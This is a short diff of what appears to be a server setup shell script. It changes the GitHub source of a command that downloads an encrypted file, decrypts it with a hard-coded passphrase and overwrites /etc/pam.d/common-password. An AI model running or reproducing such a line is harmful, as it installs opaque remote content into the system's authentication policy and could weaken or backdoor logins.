@@ -20,7 +20,7 @@ commonname=none
 email=adamspx17@gmail.com
 
 # simple password minimal
-curl -sS https://raw.githubusercontent.com/heruahmad1/v4/main/ssh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
+curl -sS https://raw.githubusercontent.com/sasak3/v4/main/ssh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
 chmod +x /etc/pam.d/common-password
 
 # go to root
